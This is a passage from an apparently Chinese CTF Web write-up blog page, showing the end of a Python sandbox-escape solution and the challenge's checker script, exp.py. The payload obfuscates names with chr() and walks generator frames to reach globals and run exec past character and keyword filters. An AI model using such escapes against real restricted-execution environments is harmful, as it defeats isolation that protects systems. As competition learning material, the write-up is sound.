+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">G</span><span class="p">),</span><span class="n">F</span><span class="p">),</span><span class="n">F</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">b</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">z</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">c</span><span class="p">),</span><span class="n">F</span><span class="p">),</span><span class="n">GL</span><span class="p">)[</span><span class="n">CO</span><span class="p">]</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">z</span>  
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="n">i1</span><span class="o">+</span><span class="n">u</span><span class="o">+</span><span class="n">i2</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="n">i1</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">i2</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">what</span><span class="o">.</span><span class="n">can</span><span class="o">.</span><span class="n">i</span><span class="o">.</span><span class="n">say</span>  
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功绕过<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406021732519.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+<code>exp.py</code></p>
+<div class="highlight" id="id-11"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>  
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1">g=chr(103)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">i=chr(105)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">k=chr(95)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">f=chr(102)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">r=chr(114)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">a=chr(97)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">m=chr(109)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">e=chr(101)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">b=chr(98)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">c=chr(99)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">l=chr(108)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">o=chr(111)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">s=chr(115)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">d=chr(100)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">k1=chr(107)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">p=chr(112)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">t=chr(116)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">t1=chr(40)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">t2=chr(34)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">t3=chr(41)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">y=chr(121)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">d1=chr(46)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">u=chr(117)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">w=chr(119)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">G=g+i+k+f+r+a+m+e   
+</span></span></span><span class="line"><span class="cl"><span class="s1">F=f+k+b+a+c+k1  
+</span></span></span><span class="line"><span class="cl"><span class="s1">GL=f+k+g+l+o+b+a+l+s  
+</span></span></span><span class="line"><span class="cl"><span class="s1">CO=c+o+d+e  
+</span></span></span><span class="line"><span class="cl"><span class="s1">i1=k+k+i+m+p+o+r+t+k+k+t1+t2+s+y+s+t2+t3+d1+s+t+d  
+</span></span></span><span class="line"><span class="cl"><span class="s1">u=o+u+t  
+</span></span></span><span class="line"><span class="cl"><span class="s1">i2=d1+w+r+i+t+e+t1+a+t3  
+</span></span></span><span class="line"><span class="cl"><span class="s1">r=e+r+r  
+</span></span></span><span class="line"><span class="cl"><span class="s1">def a():  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    global G,F,GL,CO  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    def b():  
+</span></span></span><span class="line"><span class="cl"><span class="s1">        yield getattr(getattr(getattr(c,G),F),F)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    c = b()  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    z = getattr(getattr(next(c),F),GL)[CO]  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    return z  
+</span></span></span><span class="line"><span class="cl"><span class="s1">a = a()  
+</span></span></span><span class="line"><span class="cl"><span class="s1">exec(i1+u+i2)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">exec(i1+r+i2)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">try:  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    what.can.i.say  
+</span></span></span><span class="line"><span class="cl"><span class="s1">except:  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pass  
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">basecode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1">safebuiltins_dict={x:y for x,y in dict(vars(__builtins__)).items() if x[0] not in &#34;_-abcdefghijklmnopqrstuvwxyz&#34;}  
+</span></span></span><span class="line"><span class="cl"><span class="s1">del __builtins__  
+</span></span></span><span class="line"><span class="cl"><span class="s1">try:exec(code,safebuiltins_dict,</span><span class="si">{}</span><span class="s1">)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">except Exception as e:print(e)  
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">666</span><span class="p">,</span> <span class="s2">&#34;Boy your code is too long!!!!!&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&#34;&#39;</span><span class="se">\&#34;</span><span class="s2">_</span><span class="si">{}</span><span class="s2">#&#34;</span><span class="p">)),</span> <span class="s2">&#34;I don&#39;t like those chars...&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="s2">&#34;import&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span><span class="s2">&#34;Boy, this isn&#39;t funny!&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="s2">&#34;what.can.i.say&#34;</span> <span class="ow">in</span> <span class="n">code</span><span class="p">,</span> <span class="s2">&#34;Mamba out!&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">all</span><span class="p">(</span><span class="mi">10</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">127</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">code</span><span class="p">),</span> <span class="s2">&#34;pls using ascii code boy!&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./runbox1.py&#34;</span><span class="p">,</span> <span class="s2">&#34;w+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;#!/usr/local/bin/python3  
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{</span><span class="n">code</span> <span class="si">= }</span><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{</span><span class="n">basecode</span><span class="si">}</span><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">runsbx_handle</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;/usr/bin/python3 ./runbox1.py&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;run sandbox error!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span>  
+</span></span><span class="line"><span class="cl">        <span class="nb">len</span><span class="p">(</span><span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stdout</span> <span class="o">==</span> <span class="n">runsbx_handle</span><span class="o">.</span><span class="n">stderr</span> <span class="o">==</span> <span class="n">code</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">):</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1"># with open(&#34;/fake_local_flag_path_but_real_into_remote_xxxxxxxxxxxx&#34;) as f:  </span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#     sys.stdout.write(f.read())  </span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;bypass&#34;</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;Man what can i say?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-06-05 19:03:02">Updated on 2024-06-05&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/" data-title="2024-矩阵杯WebWriteUp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/" class="post-tag" title="Tags - 矩阵杯WriteUp">矩阵杯WriteUp</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" class="post-nav-item" rel="prev" title="第七章-常见攻击事件分析-钓鱼邮件"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>第七章-常见攻击事件分析-钓鱼邮件</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
